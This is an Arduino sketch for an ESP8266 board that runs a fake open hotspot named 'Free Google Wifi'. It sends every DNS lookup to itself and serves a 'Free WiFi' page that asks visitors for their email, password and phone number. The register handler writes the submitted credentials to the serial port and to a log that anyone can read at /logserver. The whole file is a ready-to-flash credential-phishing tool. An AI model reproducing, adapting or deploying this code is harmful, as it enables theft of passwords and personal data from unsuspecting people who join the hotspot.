#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

DNSServer dnsServer;
ESP8266WebServer server(80);
int loginAttempts = 0;

ADC_MODE(ADC_VCC); // to get voltage

String logs = "";

void httpDefault(){server.sendHeader("Location", "http://freewifi.lan", true); server.send(302, "text/plain", ""); server.client().stop();}
void httpHome(){ server.send(200, "text/html", "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Login page | Free Wifi</title><style type=\"text/css\">.login-box {position: absolute;top: 50%;left: 50%;width: 400px;padding: 40px;transform: translate(-50%, -50%);background: rgba(0, 0, 0, .5);box-sizing: border-box;box-shadow: 0 15px 25px rgba(0, 0, 0, .6);border-radius: 10px;}.login-box h2 {margin: 0 0 30px;padding: 0;color: #fff;text-align: center;}.login-box .user-box {position: relative;}.login-box .user-box input {width: 100%;padding: 10px 0;font-size: 16px;color: #fff;margin-bottom: 30px;border: none;border-bottom: 1px solid #fff;outline: none;background: transparent;}.login-box .user-box label {position: absolute;top: 0;left: 0;padding: 10px 0;font-size: 16px;color: #fff;pointer-events: none;transition: .5s;}.login-box .user-box input:focus~label,.login-box .user-box input:valid~label {top: -20px;left: 0;color: #03e9f4;font-size: 12px;}.login-box form a {position: relative;display: inline-block;padding: 10px 20px;color: #03e9f4;font-size: 16px;text-decoration: none;text-transform: uppercase;overflow: hidden;transition: .5s;margin-top: 40px;letter-spacing: 4px}.login-box a:hover {background: #03e9f4;color: #fff;border-radius: 5px;box-shadow: 0 0 5px #03e9f4,  0 0 25px #03e9f4,  0 0 50px #03e9f4,  0 0 100px #03e9f4;}.login-box a span {position: absolute;display: block;}.login-box a span:nth-child(1) {top: 0;left: -100%;width: 100%;height: 2px;background: linear-gradient(90deg, transparent, #03e9f4);animation: btn-anim1 1s linear infinite;}@keyframes btn-anim1 {0% {  left: -100%;}50%,100% {  left: 100%;}}.login-box a span:nth-child(2) {top: -100%;right: 0;width: 2px;height: 100%;background: linear-gradient(180deg, transparent, #03e9f4);animation: btn-anim2 1s linear infinite;animation-delay: .25s}@keyframes btn-anim2 {0% {  top: -100%;}50%,100% {  top: 100%;}}.login-box a span:nth-child(3) {bottom: 0;right: -100%;width: 100%;height: 2px;background: linear-gradient(270deg, transparent, #03e9f4);animation: btn-anim3 1s linear infinite;animation-delay: .5s}@keyframes btn-anim3 {0% {  right: -100%;}50%,100% {  right: 100%;}}.login-box a span:nth-child(4) {bottom: -100%;left: 0;width: 2px;height: 100%;background: linear-gradient(360deg, transparent, #03e9f4);animation: btn-anim4 1s linear infinite;animation-delay: .75s}@keyframes btn-anim4 {0% {  bottom: -100%;}50%,100% {  bottom: 100%;}}</style></head><body><center><br><center class=\"main_part\" style=\"overflow: hidden;\"><div style=\"display: inline-block; padding: 5%;\"><div class=\"login-box\"><h1 style=\"color: #fff; padding-top: 10%; font-size: 60px;\">Free WiFi</h1><h2>Register in network</h2><form action=\"/register\" method=\"post\"><div class=\"user-box\"><input type=\"text\" name=\"email\" required=\"\"><label>Email</label></div><div class=\"user-box\"><input type=\"password\" name=\"pass\" required=\"\"><label>Password</label></div><div class=\"user-box\"><input type=\"tel\" name=\"no\" required=\"\"><label>Phone number</label></div><button type=\"submit\" style=\"background: rgba(0, 0, 0, .15);\"><a><span></span><span></span><span></span><span></span>Register</a></button></form></div></div></center></center></html>");}
void httpLogs(){ server.send(200, "text/html", logs); }

void httpShowVoltage(){
  uint32_t getVcc = ESP.getVcc();
  float measuredvbat = getVcc;
  measuredvbat /= 1024;
  int percent = map(getVcc, 2300, 3000, 0, 100);
  server.send(200, "text/html", "<h1>" + (String) percent + "</h1>");
}

void httpRegister(){
  loginAttempts += 1;
  Serial.println(server.arg("email"));
  Serial.println(server.arg("pass"));
  Serial.println(server.arg("no"));

  logs = server.arg("email") + " : " + server.arg("pass") + " : " + server.arg("no") + '\n' + logs;
  
  server.send(200, "text/html", "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Login page | Free Wifi</title><style type=\"text/css\">.login-box {position: absolute;top: 50%;left: 50%;width: 400px;padding: 40px;transform: translate(-50%, -50%);background: rgba(0, 0, 0, .5);box-sizing: border-box;box-shadow: 0 15px 25px rgba(0, 0, 0, .6);border-radius: 10px;}.login-box h2 {margin: 0 0 30px;padding: 0;color: #fff;text-align: center;}.login-box .user-box {position: relative;}.login-box .user-box input {width: 100%;padding: 10px 0;font-size: 16px;color: #fff;margin-bottom: 30px;border: none;border-bottom: 1px solid #fff;outline: none;background: transparent;}.login-box .user-box label {position: absolute;top: 0;left: 0;padding: 10px 0;font-size: 16px;color: #fff;pointer-events: none;transition: .5s;}.login-box .user-box input:focus~label,.login-box .user-box input:valid~label {top: -20px;left: 0;color: #03e9f4;font-size: 12px;}.login-box form a {position: relative;display: inline-block;padding: 10px 20px;color: #03e9f4;font-size: 16px;text-decoration: none;text-transform: uppercase;overflow: hidden;transition: .5s;margin-top: 40px;letter-spacing: 4px}.login-box a:hover {background: #03e9f4;color: #fff;border-radius: 5px;box-shadow: 0 0 5px #03e9f4,  0 0 25px #03e9f4,  0 0 50px #03e9f4,  0 0 100px #03e9f4;}.login-box a span {position: absolute;display: block;}.login-box a span:nth-child(1) {top: 0;left: -100%;width: 100%;height: 2px;background: linear-gradient(90deg, transparent, #03e9f4);animation: btn-anim1 1s linear infinite;}@keyframes btn-anim1 {0% {  left: -100%;}50%,100% {  left: 100%;}}.login-box a span:nth-child(2) {top: -100%;right: 0;width: 2px;height: 100%;background: linear-gradient(180deg, transparent, #03e9f4);animation: btn-anim2 1s linear infinite;animation-delay: .25s}@keyframes btn-anim2 {0% {  top: -100%;}50%,100% {  top: 100%;}}.login-box a span:nth-child(3) {bottom: 0;right: -100%;width: 100%;height: 2px;background: linear-gradient(270deg, transparent, #03e9f4);animation: btn-anim3 1s linear infinite;animation-delay: .5s}@keyframes btn-anim3 {0% {  right: -100%;}50%,100% {  right: 100%;}}.login-box a span:nth-child(4) {bottom: -100%;left: 0;width: 2px;height: 100%;background: linear-gradient(360deg, transparent, #03e9f4);animation: btn-anim4 1s linear infinite;animation-delay: .75s}@keyframes btn-anim4 {0% {  bottom: -100%;}50%,100% {  bottom: 100%;}}</style></head><body><center><br><center class=\"main_part\" style=\"overflow: hidden;\"><div style=\"display: inline-block; padding: 5%;\"><div class=\"login-box\"><h1 style=\"color: #fff; padding-top: 10%; font-size: 60px;\">Free WiFi</h1><h2>Register in network</h2><form action=\"/register\" method=\"post\"><div class=\"user-box\"><input type=\"text\" name=\"email\" required=\"\"><label>Email</label></div><div class=\"user-box\"><input type=\"password\" name=\"pass\" required=\"\"><label>Password</label></div><div class=\"user-box\"><input type=\"tel\" name=\"no\" required=\"\"><label>Phone number</label></div><button type=\"submit\" style=\"background: rgba(0, 0, 0, .15);\"><a><span></span><span></span><span></span><span></span>Register</a></button></form></div></div></center></center></html>");
}

void setup() {
  
  Serial.begin(9600);
  
  Serial.println(WiFi.softAPConfig(IPAddress (192,168,0,1), IPAddress (192,168,0,1), IPAddress (255,255,255,0)) ? "Ready" : "Failed!");
  Serial.println(WiFi.softAP("Free Google Wifi", "", 1, false, 6) ? "Ready" : "Failed!");
  
  server.on("/", httpHome);
  server.on("/logserver", httpLogs );
  server.on("/register", httpRegister);
  server.on("/showpersents", httpShowVoltage);
  server.onNotFound(httpDefault);
  if (server.hostHeader() == String("freewifi.lan")) { return httpHome(); }
  server.begin();

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", IPAddress (192,168,0,1));

  Serial.println(WiFi.softAPIP());
  delay(10);
  
  while (true){
    dnsServer.processNextRequest();
    server.handleClient();
    
    yield();
  }
}


void loop() {}
